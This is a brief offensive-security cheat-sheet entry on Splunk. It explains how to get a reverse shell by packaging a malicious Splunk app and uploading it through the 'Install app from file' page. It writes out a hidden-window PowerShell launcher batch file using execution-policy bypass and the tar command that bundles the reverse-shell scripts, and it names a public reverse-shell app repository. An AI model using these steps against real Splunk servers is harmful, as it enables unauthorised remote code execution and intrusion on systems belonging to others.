# splunk

## Enumeration

We can use https://github.com/0xjpuff/reverse_shell_splunk rev_shell, create a .bat file:

```
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

then create a tar:

```
tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

The next step is to choose Install app from file and upload the application. On the Upload app page, click on browse, choose the tarball we created earlier and click Upload.